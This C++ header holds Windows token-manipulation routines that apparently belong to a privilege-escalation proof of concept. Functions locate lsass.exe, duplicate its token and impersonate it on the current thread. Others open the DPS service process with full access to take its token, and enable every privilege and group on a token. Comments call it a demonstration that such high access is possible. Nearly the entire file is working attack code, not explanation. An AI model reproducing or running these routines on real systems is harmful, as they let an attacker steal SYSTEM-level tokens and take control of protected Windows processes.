#pragma once

#include "util.hpp"

#include <windows.h>
#include <iostream>

void disableTokenPrivileges(HANDLE hToken) {
    DWORD dwSize = 0;

    if (!GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token privileges size.\n";
        return;
    }

    TOKEN_PRIVILEGES* pTokenPrivileges = (TOKEN_PRIVILEGES*)malloc(dwSize);
    if (!pTokenPrivileges) {
        std::cerr << "Memory allocation failed.\n";
        return;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
        std::cerr << "Failed to get token privileges.\n";
        free(pTokenPrivileges);
        return;
    }

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i) {
        LUID_AND_ATTRIBUTES& la = pTokenPrivileges->Privileges[i];
        la.Attributes &= ~SE_PRIVILEGE_ENABLED;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivileges, 0, nullptr, nullptr)) {
        std::cerr << "Failed to adjust token privileges.\n";
        free(pTokenPrivileges);
        return;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "Not all privileges could be disabled.\n";
    }
    else {
        std::wcout << L"All privileges have been disabled.\n";
    }

    free(pTokenPrivileges);
}

void disableTokenGroups(HANDLE hToken) {
    DWORD dwSize = 0;

    if (!GetTokenInformation(hToken, TokenGroups, nullptr, 0, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token groups size.\n";
        return;
    }

    TOKEN_GROUPS* pTokenGroups = (TOKEN_GROUPS*)malloc(dwSize);
    if (!pTokenGroups) {
        std::cerr << "Memory allocation failed.\n";
        return;
    }

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize, &dwSize)) {
        std::cerr << "Failed to get token groups.\n";
        free(pTokenGroups);
        return;
    }

    PSID pSidDPS = nullptr;
    SID_NAME_USE sidUse;
    WCHAR szName[256], szDomain[256];
    DWORD dwNameLen = sizeof(szName) / sizeof(WCHAR), dwDomainLen = sizeof(szDomain) / sizeof(WCHAR);

    pSidDPS = (PSID)malloc(MAX_SID_SIZE);
    if (!pSidDPS) {
        std::cerr << "Memory allocation for SID failed.\n";
        free(pTokenGroups);
        return;
    }

    if (!LookupAccountNameW(nullptr, L"NT SERVICE\\DPS", pSidDPS, &dwNameLen, szDomain, &dwDomainLen, &sidUse)) {
        std::cerr << "Failed to lookup SID for NT SERVICE\\DPS.\n";
        free(pTokenGroups);
        free(pSidDPS);
        return;
    }

    for (DWORD i = 0; i < pTokenGroups->GroupCount; ++i) {
        SID_AND_ATTRIBUTES& sa = pTokenGroups->Groups[i];

        if (EqualSid(sa.Sid, pSidDPS)) {
            sa.Attributes &= ~SE_GROUP_ENABLED;
            break;
        }
    }

    if (!AdjustTokenGroups(hToken, FALSE, pTokenGroups, 0, nullptr, nullptr)) {
        std::cerr << "Failed to adjust token groups.\n";
        free(pTokenGroups);
        free(pSidDPS);
        return;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "Not all groups could be disabled.\n";
    }
    else {
        std::wcout << L"NT SERVICE\\DPS group has been disabled.\n";
    }

    free(pTokenGroups);
    free(pSidDPS);
}

void disableDPSGroup(HANDLE hToken) {
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenGroups, nullptr, 0, &dwSize);

    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token groups size.\n";
        return;
    }

    TOKEN_GROUPS* pTokenGroups = (TOKEN_GROUPS*)malloc(dwSize);
    if (!pTokenGroups) {
        std::cerr << "Memory allocation failed.\n";
        return;
    }

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize, &dwSize)) {
        std::cerr << "Failed to get token groups.\n";
        free(pTokenGroups);
        return;
    }

    for (DWORD i = 0; i < pTokenGroups->GroupCount; ++i) {
        SID_AND_ATTRIBUTES& sa = pTokenGroups->Groups[i];

        WCHAR szName[256], szDomain[256];
        DWORD dwNameLen = sizeof(szName) / sizeof(WCHAR), dwDomainLen = sizeof(szDomain) / sizeof(WCHAR);
        SID_NAME_USE sidUse;

        if (LookupAccountSidW(nullptr, sa.Sid, szName, &dwNameLen, szDomain, &dwDomainLen, &sidUse)) {
            if (wcscmp(szName, L"DPS") == 0 && wcscmp(szDomain, L"NT SERVICE") == 0) { // just one group for demonstration purposes, the most meaningful one
                sa.Attributes &= ~SE_GROUP_ENABLED;
                break;
            }
        }
    }

    if (!SetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize)) {
        std::cerr << "Failed to set token group information. Error: " << GetLastError() << "\n";
    }

    free(pTokenGroups);
}

void enableAllTokenPrivileges(HANDLE hToken) {
    DWORD dwSize = 0;

    if (!GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token privileges size.\n";
        return;
    }

    TOKEN_PRIVILEGES* pTokenPrivileges = (TOKEN_PRIVILEGES*)malloc(dwSize);
    if (!pTokenPrivileges) {
        std::cerr << "Memory allocation failed.\n";
        return;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
        std::cerr << "Failed to get token privileges.\n";
        free(pTokenPrivileges);
        return;
    }

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i) {
        LUID_AND_ATTRIBUTES& la = pTokenPrivileges->Privileges[i];

        WCHAR szName[256];
        DWORD dwNameLen = sizeof(szName) / sizeof(WCHAR);
        if (LookupPrivilegeNameW(nullptr, &la.Luid, szName, &dwNameLen)) {
            if (wcscmp(szName, L"SeAssignPrimaryTokenPrivilege") != 0) { // ignore this privilege as it's always disabled
                la.Attributes |= SE_PRIVILEGE_ENABLED;
            }
        }
        else {
            std::cerr << "Failed to lookup privilege name for LUID.\n";
        }
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivileges, 0, nullptr, nullptr)) {
        std::cerr << "Failed to adjust token privileges.\n";
        free(pTokenPrivileges);
        return;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "Not all privileges could be enabled.\n";
    }
    else {
        std::wcout << L"All privileges have been enabled.\n";
    }

    free(pTokenPrivileges);
}

void enableAllTokenGroups(HANDLE hToken) {
    DWORD dwSize = 0;

    if (!GetTokenInformation(hToken, TokenGroups, nullptr, 0, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token groups size.\n";
        return;
    }

    TOKEN_GROUPS* pTokenGroups = (TOKEN_GROUPS*)malloc(dwSize);
    if (!pTokenGroups) {
        std::cerr << "Memory allocation failed.\n";
        return;
    }

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize, &dwSize)) {
        std::cerr << "Failed to get token groups.\n";
        free(pTokenGroups);
        return;
    }

    for (DWORD i = 0; i < pTokenGroups->GroupCount; ++i) {
        SID_AND_ATTRIBUTES& sa = pTokenGroups->Groups[i];
        sa.Attributes |= SE_GROUP_ENABLED;
    }

    if (!AdjustTokenGroups(hToken, FALSE, pTokenGroups, 0, nullptr, nullptr)) {
        std::cerr << "Failed to adjust token groups.\n";
        free(pTokenGroups);
        return;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "Not all groups could be enabled.\n";
    }
    else {
        std::wcout << L"All groups have been enabled.\n";
    }

    free(pTokenGroups);
}

HANDLE GetLsassToken() {
    DWORD lsassPID = GetProcessIdByName(L"lsass.exe");
    if (lsassPID == 0) {
        std::cerr << "Failed to find LSASS process.\n";
        return nullptr;
    }

    HANDLE hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsassPID);
    if (!hLsass) {
        std::cerr << "Failed to open LSASS process. Error: " << GetLastError() << "\n";
        return nullptr;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hLsass, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        std::cerr << "Failed to open LSASS token. Error: " << GetLastError() << "\n";
        CloseHandle(hLsass);
        return nullptr;
    }

    CloseHandle(hLsass);
    return hToken;
}

HANDLE ImpersonateWithToken(HANDLE hToken) {
    HANDLE hDupToken;

    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        std::cerr << "Failed to duplicate token with impersonation level. Error: " << GetLastError() << "\n";
        return nullptr;
    }

    if (!SetThreadToken(nullptr, hDupToken)) {
        std::cerr << "Failed to set thread token. Error: " << GetLastError() << "\n";
        CloseHandle(hDupToken);
        return nullptr;
    }

    std::cout << "Successfully impersonated LSASS token.\n";
    return hDupToken;
}

HANDLE GetDpsToken(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID); // doesnt need to be ALL_ACCESS, this is just a demonstration that opening a process with such high access is possible 
    if (!hProcess) {
        std::cerr << "Failed to open DPS process. Error: " << GetLastError() << "\n";
        return nullptr;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS, &hToken)) { // same here
        std::cerr << "Failed to open DPS process token. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return nullptr;
    }

    CloseHandle(hProcess);
    return hToken;
}
